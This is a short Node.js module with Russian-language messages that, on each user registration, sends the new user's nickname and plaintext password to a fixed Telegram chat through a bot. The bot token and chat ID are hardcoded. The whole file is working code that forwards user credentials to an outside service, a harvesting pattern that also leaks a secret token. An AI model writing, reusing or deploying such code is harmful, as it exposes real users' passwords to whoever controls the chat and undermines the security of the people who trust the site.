const TelegramBot = require('node-telegram-bot-api');
const TOKEN = '8939761902:AAGuwKyQB9PCX0OgpSUq1uKxW6tYzFegD0g';
const ADMIN_CHAT = '7646143249';
const bot = TOKEN ? new TelegramBot(TOKEN, { polling: false }) : null;

async function notifyNewUser(nickname, password) {
  if (!bot || !ADMIN_CHAT) return;

  const passLine = password ? `🔑 Пароль: \`${password}\`\n` : '';

  try {
    await bot.sendMessage(
      ADMIN_CHAT,
      `🆕 Новая регистрация\n` +
      `👤 Ник: ${nickname}\n` +
      passLine,
      { parse_mode: 'Markdown' }
    );
  } catch (e) {
    console.error('❌ ОШИБКА ОТПРАВКИ РЕГИСТРАЦИИ В TELEGRAM:', e.message);
  }
}

module.exports = { notifyNewUser };
